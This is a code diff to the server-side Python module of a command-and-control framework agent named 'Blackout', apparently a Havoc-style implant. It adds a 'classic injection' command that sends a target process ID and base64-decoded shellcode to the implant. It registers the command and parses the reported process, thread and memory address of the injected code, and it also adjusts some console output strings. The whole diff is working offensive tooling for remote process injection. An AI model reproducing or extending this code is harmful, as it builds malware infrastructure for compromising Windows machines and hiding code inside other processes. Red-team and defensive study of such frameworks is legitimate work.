@@ -13,7 +13,7 @@ COMMAND_NO_JOB           = 0x102
 COMMAND_RUN              = 0x120
 COMMAND_UPLOAD           = 0x153
 COMMAND_DOWNLOAD         = 0x154
-COMMAND_SHELLINJECT      = 0x161
+COMMAND_CLASSIC          = 0x151
 
 COMMAND_EXPLORER         = 0X180
 EXPLORER_LS  = 0x181
@@ -98,6 +98,38 @@ class CommandMemoryAlloc( Command ):
 
         return Task.buffer
 
+
+class CommandClassic( Command ):
+    CommandId   = COMMAND_CLASSIC
+    Name        = "injection_classic"
+    Description = "perform classic injection"
+    Help        = ""
+    NeedAdmin   = False
+    Params = [
+        CommandParam(
+            name="process_id",
+            is_file_path=False,
+            is_optional=False
+        ),
+        CommandParam(
+            name="path_to_shellcode",
+            is_file_path=True,
+            is_optional=False
+        ),
+    ]
+
+    Mitr = []
+
+    def job_generate( self, arguments:dict ) -> bytes:
+        Task = Packer()
+
+        shellcode = b64decode( arguments[ 'path_to_shellcode' ] )
+
+        Task.add_int( self.CommandId )
+        Task.add_int( int( arguments[ 'process_id' ] ) )
+        Task.add_data( shellcode )
+
+        return Task.buffer
 
 class CommandRun( Command ):
     CommandId   = COMMAND_RUN
@@ -249,6 +281,7 @@ class Blackout(AgentType):
     Commands = [
         CommandCheckin(),
         CommandMemoryAlloc(),
+        CommandClassic(),
         CommandRun(),
         CommandCd,
         CommandPwd(),
@@ -446,12 +479,22 @@ class Blackout(AgentType):
 
                 self.console_message( AgentID, "Good", f"Memory allocated with success at 0x{base_addr:X}", "" )
 
+            elif Command == COMMAND_CLASSIC:
+                procid  = response_parser.parse_int()
+                ThreadId = response_parser.parse_int()
+                address = response_parser.parser_int64() 
+                shellcode_size = response_parser.parse_int()
+
+                Output = f"\t- Process Id: {procid}\n\t- Address: {hex(address)} [{shellcode_size} bytes]\n\t- Thread Id: {ThreadId}"
+
+                self.console_message( AgentID, "Good", f"Shellcode injected in" , Output )
+
             elif Command == COMMAND_RUN:
                 bCheck = response_parser.parse_int()
                 ProcId = response_parser.parse_int()
                 ThdId  = response_parser.parse_int()
 
-                Output = f"\t- Process ID: {ProcId}\n\t- Thread ID: {ThdId}"
+                Output = f"\t- Process ID: {ProcId}\n\t- Thread ID:  {ThdId}"
 
                 self.console_message( AgentID, "Good", f"Process create succefully:", Output )
 
@@ -474,7 +517,7 @@ class Blackout(AgentType):
                 ErrCode = response_parser.parse_int() 
                 ErrMsg  = response_parser.parse_str()
 
-                self.console_message(AgentID, "Error", f"Windows Error: {hex(ErrCode)} ({ErrMsg})", "")   
+                self.console_message(AgentID, "Error", f"Windows Error: {ErrCode} ({ErrMsg})", "")   
 
             else:
                 self.console_message( AgentID, "Error", "Command not found: %4x" % Command, "" )
